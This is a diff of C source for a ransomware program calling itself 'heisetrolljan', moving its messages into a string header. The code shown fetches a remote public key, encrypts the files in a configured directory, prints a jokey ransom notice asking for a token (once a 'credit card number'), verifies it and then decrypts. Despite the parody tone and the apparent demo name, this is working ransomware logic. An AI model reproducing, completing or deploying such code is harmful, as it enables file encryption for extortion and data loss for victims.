@@ -37,6 +37,8 @@
 #include "rsa_io.h"
 #include "sha256.h"
 
+#include "cl_text.h"
+
 #define PUBFILE			"enc_key.bin"
 #define SECFILE			"dec_key.bin"
 
@@ -64,7 +66,7 @@ static int enc_dir(const char *basedir, const uint8_t *key) {
 	size_t i;
 	char *infile, outfile[PATH_MAX];
 
-	printf("Scanning '%s' for possible frobnications...\n", CONFIG_CRYPTDIR);
+	printf(STR_ENCDIR, CONFIG_CRYPTDIR);
 	
 	if((list = fslist_scan(basedir)) == 0) return 0;
 
@@ -78,7 +80,7 @@ static int enc_dir(const char *basedir, const uint8_t *key) {
 		}
 	}
 
-	printf("Done.\n\n");
+	printf(STR_DONE "\n");
 
 	fslist_free(list);
 	return 1;
@@ -89,7 +91,7 @@ static int dec_dir(const char *basedir, const uint8_t *key) {
 	size_t i;
 	char *infile, outfile[PATH_MAX];
 
-	printf("Scanning '%s' for trading cards...\n", CONFIG_CRYPTDIR);
+	printf(STR_DECDIR, CONFIG_CRYPTDIR);
 	
 	if((list = fslist_scan(basedir)) == 0) return 0;
 
@@ -105,7 +107,7 @@ static int dec_dir(const char *basedir, const uint8_t *key) {
 		}
 	}
 
-	printf("Done.\n\n");
+	printf(STR_DONE "\n");
 
 	fslist_free(list);
 	return 1;
@@ -142,7 +144,7 @@ static uint8_t *request_pubkey(void) {
 	uint8_t *pub_serial, *sym_key, *enc_key, *out = NULL;
 	FILE *fp;
 
-	printf("Requesting the online gizmo...\n");
+	printf(STR_REQPUB);
 	if((sym_key = malloc(AES_KSIZE)) == NULL) return NULL;
 
 	if((pair = remote_pubkey(&pub_serial, &pub_len)) == NULL) goto freesym;
@@ -157,7 +159,7 @@ static uint8_t *request_pubkey(void) {
 	if(fwrite(enc_key, ct_len, 1, fp) == 0) goto closefp;
 	out = sym_key;
 
-	printf("Done.\n\n");
+	printf(STR_DONE "\n");
 
 closefp:
 	fclose(fp);
@@ -302,15 +304,13 @@ int main(void) {
 			enc_dir(CONFIG_CRYPTDIR, sym_key);
 			free(sym_key);
 		case 1:
-			printf("Oh noes! I accidentally on all your hats and broke your trophies. :/\n");
-			printf("Enter your mom's credit card number to undo or press CTRL-C to cancel.\n");
+			printf(STR_ANNOUNCE);
+			printf(STR_ENTTOKEN);
 
 			status = GENERIC_ERROR;
 			do {
-				if(status == TOKEN_REJECTED)
-					printf("That didn't work :( Try again.\n");
-				if(status == TOKEN_REUSED)
-					printf("I remember that one... It was wrong, right?\n");
+				if(status == TOKEN_REJECTED) printf(STR_TOKREJECT);
+				if(status == TOKEN_REUSED) printf(STR_TOKREUSED);
 				request_token = line_in(stdin);
 				if(request_token[0] == '\0')
 					break;
@@ -319,27 +319,24 @@ int main(void) {
 				free(request_token);
 			} while((status == TOKEN_REJECTED) || (status == TOKEN_REUSED));
 
-			if(status == TOKEN_REUSED) {
-
-			}
 			if(status == GENERIC_ERROR) {
-				fprintf(stderr, "Something went wrong. You lost 10%% XP. Maybe try again later.\n");
+				printf(STR_GENERR);
 				break;
 			} else if(status == UNKNOWN_KEY) {
-				fprintf(stderr, "Looks like I lost my key. Thanks anyway.\n");
+				printf(STR_UNKKEY);
 				break;
 			}
-			printf("YAY! It worked! :D Let me upgrade your DLC...\n\n");
+			printf(STR_TOKGOOD "\n");
 			dec_dir(CONFIG_CRYPTDIR, sym_key);
 			free(sym_key);
 
 			break;
 		case 2:
-			printf("Deleting keys... ");
+			printf(STR_DELKEYS);
 			remove(PUBFILE);
 			remove(SECFILE);
-			printf("Done.\n");
-			printf("Thank you for choosing heisetrolljan\n");
+			printf(STR_DONE);
+			printf(STR_BYE);
 	}
 	return EXIT_SUCCESS;
 }
